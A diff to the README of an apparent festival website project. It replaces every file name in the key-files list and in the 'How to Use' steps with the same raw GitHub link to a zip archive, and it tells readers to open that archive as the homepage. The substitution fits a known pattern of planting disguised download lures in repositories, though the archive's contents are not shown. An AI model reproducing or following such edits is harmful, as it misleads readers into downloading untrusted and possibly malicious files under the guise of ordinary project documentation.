@@ -2,17 +2,17 @@
 ### Key Files
 
 - **HTML Files**: Core pages of the website.
-  - `index.html`: Homepage of the website.
-  - `about.html`: About the festival.
-  - `contact.html`: Contact information.
-  - `gallery.html`: Image gallery.
-  - `register.html`: Registration form.
+  - `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip`: Homepage of the website.
+  - `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip`: About the festival.
+  - `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip`: Contact information.
+  - `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip`: Image gallery.
+  - `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip`: Registration form.
 
 - **CSS**: Styling for the website.
-  - `css/bootstrap.css`: Contains styles for forms, buttons, and layout.
+  - `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip`: Contains styles for forms, buttons, and layout.
 
 - **JavaScript**: Adds interactivity.
-  - `js/bootstrap.bundle.js`: Includes Bootstrap's JavaScript components.
+  - `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip`: Includes Bootstrap's JavaScript components.
 
 - **Images**: Placeholder for festival-related images.
 
@@ -25,7 +25,7 @@
 ## How to Use
 
 1. Clone the repository or download the project files.
-2. Open `index.html` in your browser to view the homepage.
+2. Open `https://raw.githubusercontent.com/Aastha12378/Festiva/main/subcylindrical/Festiva.zip` in your browser to view the homepage.
 3. Navigate through the pages using the links provided.
 
 ## License
